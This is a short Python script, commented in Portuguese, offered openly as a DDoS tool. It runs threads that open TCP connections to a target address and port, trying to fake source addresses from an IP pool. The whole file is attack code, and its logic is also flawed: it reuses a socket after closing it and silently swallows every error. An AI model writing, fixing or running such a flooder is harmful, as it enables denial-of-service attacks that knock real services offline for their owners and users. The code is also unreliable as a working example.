import socket
import threading
import time
import random


def ddos_thread(target_ip, target_port, duration, packets_per_second, ip_pool, port_pool):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)

    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Escolhe um endereço IP aleatório da pool
            src_ip = random.choice(ip_pool)
            # Escolhe uma porta aleatória da pool
            src_port = random.choice(port_pool)
            sock.bind((src_ip, src_port))
            sock.connect((target_ip, target_port))
            sock.send(b"")
            sock.close()
        except:
            pass
        time.sleep(random.uniform(0, 1 / packets_per_second))

    sock.close()


def ddos_attack(target_ip, target_port, duration, packets_per_second, threads, ip_pool, port_pool):
    for i in range(threads):
        thread = threading.Thread(target=ddos_thread,
                                  args=(target_ip, target_port, duration, packets_per_second, ip_pool, port_pool))
        thread.start()


if __name__ == "__main__":
    target_ip = "192.168.1.1"  # RTIA
    target_port = 80  # RTP
    duration = 60  # DAS
    packets_per_second = 10  # NPPS
    threads = 10  # N. of Thr--- to use

    # Pool De end.
    ip_pool = ["192.168.1.2", "192.168.1.3", "192.168.1.4"]
    port_pool = [1000, 2000, 3000]

    ddos_attack(target_ip, target_port, duration, packets_per_second, threads, ip_pool, port_pool)
